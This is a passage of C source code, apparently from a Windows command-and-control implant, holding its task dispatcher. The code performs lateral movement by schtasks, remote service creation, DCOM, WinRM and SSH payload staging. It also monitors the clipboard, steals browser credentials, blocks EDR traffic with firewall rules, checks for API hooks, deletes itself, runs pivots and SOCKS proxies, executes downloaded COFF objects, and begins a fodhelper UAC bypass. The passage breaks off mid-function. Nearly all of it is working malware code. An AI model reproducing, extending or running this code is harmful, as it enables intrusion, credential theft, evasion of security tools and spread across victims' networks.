            snprintf(lat_buf,sizeof(lat_buf),"schtasks /Run /TN %s 2>&1",ru_tn);
            char *rr2=run_shell(lat_buf);
            if (shell_output_is_error(rr2)) {
                agent_send_result(task->id, "", rr2 ? rr2 : "runas: schtasks /Run failed");
                free(rr2);
                snprintf(lat_buf,sizeof(lat_buf),"schtasks /Delete /TN %s /F 2>&1",ru_tn);
                char *cleanup=run_shell(lat_buf); free(cleanup);
                return;
            }
            strncat(ru_res,rr2?rr2:"",sizeof(ru_res)-strlen(ru_res)-1);
            free(rr2);
            Sleep(3000);
            snprintf(lat_buf,sizeof(lat_buf),"schtasks /Delete /TN %s /F 2>&1",ru_tn);
            char *rr3=run_shell(lat_buf);
            strncat(ru_res,rr3?rr3:"",sizeof(ru_res)-strlen(ru_res)-1);
            free(rr3);
            agent_send_result(task->id,ru_res,"");
        } else if (_stricmp(lat_method, "wmi") == 0) {
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);

            uint8_t *payload_data = NULL; size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd, "rb");
                    if (pf) {
                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
                        payload_data=(uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data,1,payload_len,pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","wmi: no payload"); return; }

            const char *remote_path_wmi = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
            free(payload_data);
            if (!remote_path_wmi) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","wmi: SMB staging failed"); return; }

            /* Use schtasks with explicit domain-user credentials so the child
             * runs as the provided account (not SYSTEM/machine-account), enabling
             * cross-domain named-pipe auth back to the parent. */
            char wmi_at[8]; runas_start_time(wmi_at, sizeof(wmi_at));
            char sch_create[1536], sch_run[512], sch_del[256];
            if (lat_user[0] && lat_pass[0]) {
                snprintf(sch_create, sizeof(sch_create),
                    "schtasks /Create /S \"%s\" /U \"%s\" /P \"%s\" /RU \"%s\" /RP \"%s\""
                    " /SC ONCE /ST %s /F /TN \"%s\" /TR \"%s\" 2>&1",
                    lat_host, lat_user, lat_pass, lat_user, lat_pass,
                    wmi_at, svc_name, remote_path_wmi);
                snprintf(sch_run, sizeof(sch_run),
                    "schtasks /Run /S \"%s\" /U \"%s\" /P \"%s\" /TN \"%s\" 2>&1",
                    lat_host, lat_user, lat_pass, svc_name);
                snprintf(sch_del, sizeof(sch_del),
                    "schtasks /Delete /S \"%s\" /U \"%s\" /P \"%s\" /TN \"%s\" /F 2>&1",
                    lat_host, lat_user, lat_pass, svc_name);
            } else {
                snprintf(sch_create, sizeof(sch_create),
                    "schtasks /Create /S \"%s\" /RU SYSTEM /SC ONCE /ST %s /F /TN \"%s\" /TR \"%s\" 2>&1",
                    lat_host, wmi_at, svc_name, remote_path_wmi);
                snprintf(sch_run, sizeof(sch_run),
                    "schtasks /Run /S \"%s\" /TN \"%s\" 2>&1", lat_host, svc_name);
                snprintf(sch_del, sizeof(sch_del),
                    "schtasks /Delete /S \"%s\" /TN \"%s\" /F 2>&1", lat_host, svc_name);
            }
            char *cr_out = run_shell(sch_create);
            char *rn_out = run_shell(sch_run);
            char *dl_out = run_shell(sch_del); free(dl_out);
            smb_stage_cleanup(lat_host, lat_user);
            char res_wmi[1536];
            snprintf(res_wmi, sizeof(res_wmi), "[+] wmi → %s\n    path: %s\n%s\n%s",
                lat_host, remote_path_wmi, cr_out?cr_out:"", rn_out?rn_out:"");
            free(cr_out); free(rn_out);
            agent_send_result(task->id, res_wmi, "");

        } else if (_stricmp(lat_method, "smbexec") == 0) {
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);

            uint8_t *payload_data = NULL; size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd,"rb");
                    if (pf) {
                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
                        payload_data=(uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data,1,payload_len,pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","smbexec: no payload"); return; }

            const char *remote_path_smb = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
            free(payload_data);
            if (!remote_path_smb) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","smbexec: SMB staging failed"); return; }

            /* binPath = cmd.exe launching agent — breaks out of Service Job Object */
            char bin_path[768];
            snprintf(bin_path, sizeof(bin_path),
                "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"%s\"", remote_path_smb);

            WCHAR whost_smb[256]={0}, wsvc_smb[64]={0}, wbin_smb[768]={0};
            MultiByteToWideChar(CP_ACP,0,lat_host,  -1,whost_smb,256);
            MultiByteToWideChar(CP_ACP,0,svc_name,  -1,wsvc_smb, 64);
            MultiByteToWideChar(CP_ACP,0,bin_path,  -1,wbin_smb, 768);

            SC_HANDLE hScm_smb = OpenSCManagerW(whost_smb, NULL, SC_MANAGER_ALL_ACCESS);
            if (!hScm_smb) {
                char e[128]; snprintf(e,sizeof(e),"smbexec: OpenSCManager failed: %lu",GetLastError());
                smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"",e); return;
            }
            SC_HANDLE hSvc_smb = CreateServiceW(hScm_smb, wsvc_smb, wsvc_smb, SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                wbin_smb, NULL, NULL, NULL, NULL, NULL);
            if (!hSvc_smb) {
                char e[128]; snprintf(e,sizeof(e),"smbexec: CreateService failed: %lu",GetLastError());
                CloseServiceHandle(hScm_smb); smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"",e); return;
            }
            StartServiceW(hSvc_smb, 0, NULL);
            DeleteService(hSvc_smb);
            CloseServiceHandle(hSvc_smb);
            CloseServiceHandle(hScm_smb);
            smb_stage_cleanup(lat_host, lat_user);
            char res_smb[512];
            snprintf(res_smb, sizeof(res_smb),
                "[+] smbexec → %s\n    svc: %s\n    chain: SERVICES.EXE→cmd.exe→agent",
                lat_host, svc_name);
            agent_send_result(task->id, res_smb, "");

        } else if (_stricmp(lat_method, "dcom") == 0) {
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);

            uint8_t *payload_data = NULL; size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd,"rb");
                    if (pf) {
                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
                        payload_data=(uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data,1,payload_len,pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","dcom: no payload"); return; }

            const char *remote_path_dcom = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
            free(payload_data);
            if (!remote_path_dcom) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","dcom: SMB staging failed"); return; }

            /* Use MMC20.Application DCOM object to execute the staged payload */
            char ps_dcom[2048];
            snprintf(ps_dcom, sizeof(ps_dcom),
                "powershell -NoP -W Hidden -Exec Bypass -C \""
                "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','%s'));"
                "$c.Document.ActiveView.ExecuteShellCommand('%s',$null,'','7')\"",
                lat_host, remote_path_dcom);
            char *dcom_out = run_shell(ps_dcom);
            smb_stage_cleanup(lat_host, lat_user);
            char res_dcom[1024];
            snprintf(res_dcom, sizeof(res_dcom), "[+] dcom → %s\n    path: %s\n%s",
                lat_host, remote_path_dcom, dcom_out?dcom_out:"");
            free(dcom_out);
            agent_send_result(task->id, res_dcom, "");

        } else if (_stricmp(lat_method, "winrm") == 0) {
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);

            uint8_t *payload_data = NULL; size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd,"rb");
                    if (pf) {
                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
                        payload_data=(uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data,1,payload_len,pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","winrm: no payload"); return; }

            const char *remote_path_wrm = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
            free(payload_data);
            if (!remote_path_wrm) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","winrm: SMB staging failed"); return; }

            char ps_wrm[4096];
            if (lat_user[0] && lat_pass[0]) {
                snprintf(ps_wrm, sizeof(ps_wrm),
                    "powershell -NoP -W Hidden -Exec Bypass -C \""
                    "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
                    "try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}"
                    "catch{$ip='%s'};"
                    "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
                    "Invoke-Command -ComputerName $ip -Credential $c "
                    "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
                    lat_host, lat_host, lat_user, lat_pass, remote_path_wrm);
            } else {
                snprintf(ps_wrm, sizeof(ps_wrm),
                    "powershell -NoP -W Hidden -Exec Bypass -C \""
                    "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
                    "try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}"
                    "catch{$ip='%s'};"
                    "Invoke-Command -ComputerName $ip "
                    "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
                    lat_host, lat_host, remote_path_wrm);
            }
            char *winrm_out = run_shell(ps_wrm);
            smb_stage_cleanup(lat_host, lat_user);
            char res_wrm[1024];
            snprintf(res_wrm, sizeof(res_wrm), "[+] winrm → %s\n    path: %s\n%s",
                lat_host, remote_path_wrm, winrm_out?winrm_out:"");
            free(winrm_out);
            agent_send_result(task->id, res_wrm, "");

        } else if (_stricmp(lat_method, "ssh") == 0) {
            /* SSH lateral — uses Windows built-in ssh.exe/scp.exe (Win10+).
             * Stages payload to /tmp/ on a remote Linux or Windows-SSH host. */
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "agent_%lu", (unsigned long)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.elf", svc_name);

            /* Write payload bytes to a local temp file for scp */
            const char *tmp_env = getenv("TEMP");
            if (!tmp_env) tmp_env = "C:\\Windows\\Temp";
            char tmp_path[MAX_PATH];
            snprintf(tmp_path, sizeof(tmp_path), "%s\\%s", tmp_env, exe_name);

            uint8_t *payload_data = NULL; size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd,"rb");
                    if (pf) {
                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
                        payload_data=(uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data,1,payload_len,pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) {
                free(payload_data);
                agent_send_result(task->id,"","ssh: no payload"); return;
            }
            FILE *tf = fopen(tmp_path, "wb");
            if (!tf) { free(payload_data); agent_send_result(task->id,"","ssh: failed to write temp file"); return; }
            fwrite(payload_data, 1, payload_len, tf);
            fclose(tf);
            free(payload_data);

            /* Parse optional host:port */
            char ssh_host[256]={0}; char ssh_port[16]="22";
            const char *colon = strchr(lat_host, ':');
            if (colon) {
                strncpy(ssh_host, lat_host, (size_t)(colon-lat_host));
                strncpy(ssh_port, colon+1, sizeof(ssh_port)-1);
            } else {
                strncpy(ssh_host, lat_host, sizeof(ssh_host)-1);
            }

            char remote_path_ssh[256];
            snprintf(remote_path_ssh, sizeof(remote_path_ssh), "/tmp/%s", exe_name);

            const char *ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes";
            char scp_cmd[1024], ssh_cmd[1024];
            snprintf(scp_cmd, sizeof(scp_cmd),
                "scp -P %s %s \"%s\" %s@%s:%s 2>&1",
                ssh_port, ssh_opts, tmp_path, lat_user, ssh_host, remote_path_ssh);
            snprintf(ssh_cmd, sizeof(ssh_cmd),
                "ssh -p %s %s %s@%s \"chmod +x %s && nohup %s </dev/null >/dev/null 2>&1 &\" 2>&1",
                ssh_port, ssh_opts, lat_user, ssh_host, remote_path_ssh, remote_path_ssh);

            char *scp_out = run_shell(scp_cmd);
            char *ssh_out = run_shell(ssh_cmd);
            char res_ssh[2048]={0};
            snprintf(res_ssh, sizeof(res_ssh),
                "[+] ssh → %s\n    path: %s\nscp: %s\nssh: %s",
                lat_host, remote_path_ssh, scp_out?scp_out:"", ssh_out?ssh_out:"");
            free(scp_out); free(ssh_out);
            DeleteFileA(tmp_path);
            agent_send_result(task->id, res_ssh, "");

        } else {
            char e2[128];
            snprintf(e2, sizeof(e2),
                "unknown lateral method: %s — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas",
                lat_method);
            agent_send_result(task->id,"",e2);
        }
    }
    else if (strcmp(type_upper, "CLIP_MONITOR_START") == 0) {
        if (!g_clip_stop) { agent_send_result(task->id,"","clipboard monitor already running"); return; }
        g_clip_len = 0; g_clip_buf[0] = '\0';
        int iv = json_get_int(args,"interval",5);
        g_clip_interval = (iv > 0 ? iv : 5);
        g_clip_thread = CreateThread(NULL,0,ClipMonThread,NULL,0,NULL);
        agent_send_result(task->id,g_clip_thread?"[+] clipboard monitor started":"","");
    }
    else if (strcmp(type_upper, "CLIP_MONITOR_DUMP") == 0) {
        agent_send_result(task->id, g_clip_len ? g_clip_buf : "[no clipboard data]", "");
        g_clip_len = 0; g_clip_buf[0] = '\0';
    }
    else if (strcmp(type_upper, "CLIP_MONITOR_STOP") == 0) {
        g_clip_stop = 1;
        if (g_clip_thread) { WaitForSingleObject(g_clip_thread,3000); CloseHandle(g_clip_thread); g_clip_thread=NULL; }
        agent_send_result(task->id,"[+] clipboard monitor stopped","");
    }
    else if (strcmp(type_upper, "SEARCH") == 0) {
        /* args: "[root] pattern" or JSON {"root":"...","pattern":"..."} */
        char root[MAX_PATH] = {0}, pattern[256] = {0};
        if (args && args[0] == '{') {
            json_get_str(args,"root",root,sizeof(root),"");
            json_get_str(args,"pattern",pattern,sizeof(pattern),"");
        } else if (args && args[0]) {
            /* space-separated: optional_root pattern */
            char tmp[MAX_PATH+256]; strncpy(tmp,args,sizeof(tmp)-1);
            char *sp = strchr(tmp,' ');
            if (sp) { *sp='\0'; strncpy(root,tmp,sizeof(root)-1); strncpy(pattern,sp+1,sizeof(pattern)-1); }
            else     { strncpy(pattern,tmp,sizeof(pattern)-1); }
        }
        if (!pattern[0]) { agent_send_result(task->id,"","usage: search [root] <pattern>"); return; }
        if (!root[0]) { /* default: user's home + common paths */
            const char *ud = getenv("USERPROFILE");
            if (ud) strncpy(root,ud,sizeof(root)-1); else strncpy(root,"C:\\",3);
        }
        g_search_count = 0; g_search_rlen = 0; g_search_results[0] = '\0';
        search_dir(root, pattern, 2000);
        if (g_search_count == 0)
            agent_send_result(task->id,"no files found","");
        else {
            char hdr[128]; snprintf(hdr,sizeof(hdr),"[%d files]\n",g_search_count);
            char *out2 = malloc(strlen(hdr)+g_search_rlen+1);
            if (out2) { strcpy(out2,hdr); strcat(out2,g_search_results); agent_send_result(task->id,out2,""); free(out2); }
            else agent_send_result(task->id,g_search_results,"");
        }
    }
    else if (strcmp(type_upper, "EVASION_STATUS") == 0) {
        char status[512];
        int sl = g_sleep_sec;
        int jt = g_jitter_pct;
        snprintf(status, sizeof(status),
            "sleep_sec=%d jitter_pct=%d keylog=%s screenwatch=%s socks=%s clip_monitor=%s",
            sl, jt,
            g_keylog_stop  ? "off" : "on",
            g_sw_stop ? "off" : "on",
            g_socks_stop   ? "off" : "on",
            g_clip_stop    ? "off" : "on");
        agent_send_result(task->id, status, "");
    }
    else if (strcmp(type_upper, "CLEANUP") == 0) {
        char self[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, self, sizeof(self)-1);
        char cmd[MAX_PATH+64];
        snprintf(cmd, sizeof(cmd),
            "cmd /c ping -n 3 127.0.0.1 > nul & del /f /q \"%s\"", self);
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW|DETACHED_PROCESS, NULL, NULL, &si, &pi);
        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        agent_send_result(task->id, "[+] scheduled self-delete; exiting", "");
        ExitProcess(0);
    }
    else if (strcmp(type_upper, "BROWSER_CREDS") == 0) {
        char *out = do_browser_creds();
        agent_send_result(task->id, out ? out : "no credentials found", "");
        free(out);
    }
    else if (strcmp(type_upper, "DRIVES") == 0) {
        WCHAR buf[256] = {0};
        DWORD ret = GetLogicalDriveStringsW(255, buf);
        char json[2048] = {0};
        strcat(json, "{\"cwd\":\"\",\"path\":\"\",\"drives\":true,\"entries\":[");
        int first = 1;
        for (DWORD i = 0; i < ret; ) {
            if (buf[i] == 0) break;
            DWORD j = i;
            while (buf[j]) j++;
            char drive[16] = {0};
            WideCharToMultiByte(CP_UTF8, 0, buf + i, -1, drive, sizeof(drive)-1, NULL, NULL);
            /* strip trailing backslash for cleaner display but keep it */
            char ent[128];
            snprintf(ent, sizeof(ent), "%s{\"name\":\"%s\",\"is_dir\":true,\"size\":0,\"mod\":\"\"}",
                     first ? "" : ",", drive);
            strncat(json, ent, sizeof(json) - strlen(json) - 1);
            first = 0;
            i = j + 1;
        }
        strcat(json, "]}");
        agent_send_result(task->id, json, "");
    }
    else if (strcmp(type_upper, "NET_SHARES") == 0) {
        char host[256] = {0};
        /* args may be plain hostname or JSON {"host":"..."} */
        if (args && args[0] == '{') {
            json_get_str(args, "host", host, sizeof(host), "");
        } else if (args && args[0]) {
            const char *p = args;
            while (*p == '\\' || *p == '/') p++;
            strncpy(host, p, sizeof(host)-1);
        }
        char cmd[512];
        if (host[0])
            snprintf(cmd, sizeof(cmd), "net view \\\\%s /all 2>&1", host);
        else
            snprintf(cmd, sizeof(cmd), "net share 2>&1");
        char *raw = run_shell(cmd);
        if (!raw) { agent_send_result(task->id, "", "net_shares: run failed"); return; }
        /* Parse output — entries follow the "---" separator line */
        char json[8192] = {0};
        strcat(json, "{\"cwd\":\"\",\"path\":\"\",\"entries\":[");
        int first = 1, parsing = 0;
        char *line = strtok(raw, "\n");
        while (line) {
            while (*line == '\r' || *line == ' ') line++;
            if (strstr(line, "---")) { parsing = 1; line = strtok(NULL, "\n"); continue; }
            if (!parsing || !line[0]) { line = strtok(NULL, "\n"); continue; }
            /* stop at command-completed message */
            char lc[256] = {0}; strncpy(lc, line, sizeof(lc)-1);
            for (char *q = lc; *q; q++) *q = (char)tolower((unsigned char)*q);
            if (strstr(lc, "command completed") || strstr(lc, "comando completado")) break;
            /* first field is the share name */
            char name[128] = {0}; int i = 0;
            while (line[i] && !isspace((unsigned char)line[i]) && i < 127) { name[i] = line[i]; i++; }
            if (!name[0]) { line = strtok(NULL, "\n"); continue; }
            char ent[256];
            snprintf(ent, sizeof(ent), "%s{\"name\":\"%s\",\"is_dir\":true,\"size\":0,\"mod\":\"\"}",
                     first ? "" : ",", name);
            strncat(json, ent, sizeof(json) - strlen(json) - 1);
            first = 0;
            line = strtok(NULL, "\n");
        }
        free(raw);
        strcat(json, "]}");
        agent_send_result(task->id, json, "");
    }
    else if (strcmp(type_upper, "HOOK_CHECK") == 0) {
        /* hash-only table — no NT function name strings in binary */
        static const struct { uint32_t h; const char *label; } hk_fns[] = {
            {H_NT_NtOpenProcess,           "NtOpenProc"},
            {H_NT_NtAllocateVirtualMemory, "NtAllocVM"},
            {H_NT_NtWriteVirtualMemory,    "NtWriteVM"},
            {H_NT_NtCreateThreadEx,        "NtCreateThr"},
            {H_NT_NtProtectVirtualMemory,  "NtProtVM"},
            {H_NT_NtReadVirtualMemory,     "NtReadVM"},
            {H_NT_NtQueueApcThread,        "NtQueueApc"},
            {H_NT_NtCreateSection,         "NtCreateSect"},
            {H_NT_NtMapViewOfSection,      "NtMapView"},
            {H_NT_NtUnmapViewOfSection,    "NtUnmapView"},
            {H_NT_NtSuspendThread,         "NtSuspend"},
            {H_NT_NtResumeThread,          "NtResume"},
            {H_NT_NtGetContextThread,      "NtGetCtx"},
            {H_NT_NtSetContextThread,      "NtSetCtx"},
            {0, NULL}
        };
        char sb[4096] = "[HOOK_CHECK]\n";
        for (int i = 0; hk_fns[i].label; i++) {
            void *fn = resolve_fn(hk_fns[i].h);
            if (!fn) {
                char tmp[128];
                snprintf(tmp, sizeof(tmp), "  MISS  ntdll!%s (not found)\n", hk_fns[i].label);
                strncat(sb, tmp, sizeof(sb)-strlen(sb)-1);
                continue;
            }
            unsigned char b = *(unsigned char*)fn;
            const char *status = (b==0xE9)?"HOOKED (JMP)":(b==0xE8)?"HOOKED (CALL)":(b==0xCC)?"HOOKED (INT3)":"clean";
            char tmp[128];
            snprintf(tmp, sizeof(tmp), "  %c     ntdll!%s -> %s (0x%02X)\n",
                     (b==0xE9||b==0xE8||b==0xCC)?'!':' ', hk_fns[i].label, status, (unsigned)b);
            strncat(sb, tmp, sizeof(sb)-strlen(sb)-1);
        }
        agent_send_result(task->id, sb, "");
    }
    else if (strcmp(type_upper, "EDR_SILENCE") == 0) {
        long long pid = 0;
        {
            const char *p = strstr(task->args, "\"pid\"");
            if (p) { p = strchr(p, ':'); if (p) pid = atoll(p+1); }
        }
        if (pid <= 0) {
            agent_send_result(task->id, "", "EDR_SILENCE requires {\"pid\":N}");
        } else {
            char ps_cmd[256];
            snprintf(ps_cmd, sizeof(ps_cmd),
                "powershell -NoProfile -NonInteractive -Command \"(Get-Process -Id %lld).Path\"", pid);
            char *proc_path = run_shell(ps_cmd);
            char path_clean[1024] = {0};
            if (proc_path) {
                char *p2 = proc_path;
                while (*p2 == '\r' || *p2 == '\n' || *p2 == ' ') p2++;
                size_t l = strlen(p2);
                while (l > 0 && (p2[l-1]=='\r'||p2[l-1]=='\n'||p2[l-1]==' ')) p2[--l]='\0';
                strncpy(path_clean, p2, sizeof(path_clean)-1);
                free(proc_path);
            }
            if (!path_clean[0]) {
                agent_send_result(task->id, "", "EDR_SILENCE: could not resolve process path");
            } else {
                char rule[64]; snprintf(rule, sizeof(rule), "EDRSilence_%lld", pid);
                char netsh[1024];
                snprintf(netsh, sizeof(netsh),
                    "netsh advfirewall firewall add rule name=\"%s\" dir=out action=block program=\"%s\" enable=yes",
                    rule, path_clean);
                char *out3 = run_shell(netsh);
                char res[2048]; snprintf(res, sizeof(res), "[+] EDR_SILENCE pid=%lld path=%s\n%s", pid, path_clean, out3 ? out3 : "");
                if (out3) free(out3);
                agent_send_result(task->id, res, "");
            }
        }
    }
    else if (strcmp(type_upper, "EDR_SILENCE_RM") == 0) {
        long long pid = 0;
        {
            const char *p = strstr(task->args, "\"pid\"");
            if (p) { p = strchr(p, ':'); if (p) pid = atoll(p+1); }
        }
        if (pid <= 0) {
            agent_send_result(task->id, "", "EDR_SILENCE_RM requires {\"pid\":N}");
        } else {
            char rule[64]; snprintf(rule, sizeof(rule), "EDRSilence_%lld", pid);
            char netsh[256];
            snprintf(netsh, sizeof(netsh), "netsh advfirewall firewall delete rule name=\"%s\"", rule);
            char *out4 = run_shell(netsh);
            char res2[512]; snprintf(res2, sizeof(res2), "[+] rule removed: %s\n%s", rule, out4 ? out4 : "");
            if (out4) free(out4);
            agent_send_result(task->id, res2, "");
        }
    }
    else if (strcmp(type_upper, "RSOCKS_START") == 0) {
        char *out5 = rsocks_start(task->args[0] ? task->args : "0");
        agent_send_result(task->id, out5 ? out5 : "[-] rsocks_start failed", "");
        if (out5) free(out5);
    }
    else if (strcmp(type_upper, "RSOCKS_STOP") == 0) {
        rsocks_stop();
        agent_send_result(task->id, "[+] rsocks stopped", "");
    }
    else if (strcmp(type_upper, "HTTP_PIVOT_START") == 0) {
        int port6 = 0;
        const char *parg = strstr(task->args, "\"port\"");
        if (parg) { parg = strchr(parg, ':'); if (parg) port6 = atoi(parg+1); }
        if (port6 <= 0) {
            agent_send_result(task->id, "", "HTTP_PIVOT_START requires {\"port\":N}");
        } else {
            char *out6 = http_pivot_start(port6, g_agent.agent_id);
            agent_send_result(task->id, out6 ? out6 : "[-] http_pivot_start failed", "");
            if (out6) free(out6);
        }
    }
    else if (strcmp(type_upper, "HTTP_PIVOT_STOP") == 0) {
        http_pivot_stop();
        agent_send_result(task->id, "[+] HTTP pivot stopped", "");
    }
    else if (strcmp(type_upper, "TCP_PIVOT_START") == 0) {
        int port7 = 0;
        const char *parg2 = strstr(task->args, "\"port\"");
        if (parg2) { parg2 = strchr(parg2, ':'); if (parg2) port7 = atoi(parg2+1); }
        if (port7 <= 0) {
            agent_send_result(task->id, "", "TCP_PIVOT_START requires {\"port\":N}");
        } else {
            char *out7 = tcp_pivot_start(port7, g_agent.agent_id);
            agent_send_result(task->id, out7 ? out7 : "[-] tcp_pivot_start failed", "");
            if (out7) free(out7);
        }
    }
    else if (strcmp(type_upper, "TCP_PIVOT_STOP") == 0) {
        tcp_pivot_stop();
        agent_send_result(task->id, "[+] TCP pivot stopped", "");
    }
#ifdef _WIN32
    else if (strcmp(type_upper, "BOF") == 0) {
        /* args JSON: {"coff_b64":"<base64 COFF>","args_b64":"<base64 packed args>"} */
        const char *coff_start = NULL;
        const char *args_start = NULL;
        size_t coff_b64_len = 0, args_b64_len = 0;

        /* Extract coff_b64 value */
        const char *p = strstr(args, "\"coff_b64\"");
        if (p) {
            p = strchr(p + 10, '"');
            if (p) {
                p++;
                const char *end = p;
                while (*end && *end != '"') end++;
                coff_start   = p;
                coff_b64_len = (size_t)(end - p);
            }
        }
        size_t coff_len = 0;
        uint8_t *coff_data = NULL;

        if (coff_start && coff_b64_len > 0) {
            char *coff_b64 = (char *)malloc(coff_b64_len + 1);
            if (!coff_b64) { agent_send_result(task->id, "", "BOF: oom"); return; }
            memcpy(coff_b64, coff_start, coff_b64_len);
            coff_b64[coff_b64_len] = '\0';
            coff_data = b64_decode(coff_b64, &coff_len);
            free(coff_b64);
            if (!coff_data || coff_len == 0) {
                free(coff_data);
                agent_send_result(task->id, "", "BOF: coff_b64 decode failed"); return;
            }
        } else {
            /* no inline payload — check in-process store; first token of args is the name */
            char bof_name[128] = "";
            sscanf(args, "%127s", bof_name);
            uint8_t *stored = bof_name[0] ? bof_store_get(bof_name, &coff_len) : NULL;
            if (!stored || coff_len == 0) {
                agent_send_result(task->id, "", "BOF: missing coff_b64 and not in store"); return;
            }
            coff_data = (uint8_t*)malloc(coff_len);
            if (!coff_data) { agent_send_result(task->id, "", "BOF: oom"); return; }
            memcpy(coff_data, stored, coff_len);
        }

        /* Extract optional args_b64 value */
        uint8_t *bof_args  = NULL;
        size_t   bof_alen  = 0;
        p = strstr(args, "\"args_b64\"");
        if (p) {
            p = strchr(p + 10, '"');
            if (p) {
                p++;
                const char *end = p;
                while (*end && *end != '"') end++;
                args_start   = p;
                args_b64_len = (size_t)(end - p);
                if (args_b64_len > 0) {
                    char *ab64 = (char *)malloc(args_b64_len + 1);
                    if (ab64) {
                        memcpy(ab64, args_start, args_b64_len);
                        ab64[args_b64_len] = '\0';
                        bof_args = b64_decode(ab64, &bof_alen);
                        free(ab64);
                    }
                }
            }
        }

        char *out = bof_exec(coff_data, coff_len, bof_args, bof_alen);
        free(coff_data);
        free(bof_args);
        if (out) {
            agent_send_result(task->id, out, "");
            free(out);
        } else {
            agent_send_result(task->id, "", "BOF: execution failed");
        }
    }
#endif /* _WIN32 */
#ifdef _WIN32
    else if (strcmp(type_upper, "ELEVATE") == 0) {
        /* UAC bypass via fodhelper/computerdefaults registry hijack */
        /* Args: "fodhelper <cmd>" | "computerdefaults <cmd>" — default: fodhelper + self */
        char elv_meth[32] = "fodhelper";
        char elv_cmd[1024] = "";
        const char *sp = strchr(args, ' ');
        if (sp) {
            size_t ml = (size_t)(sp - args);
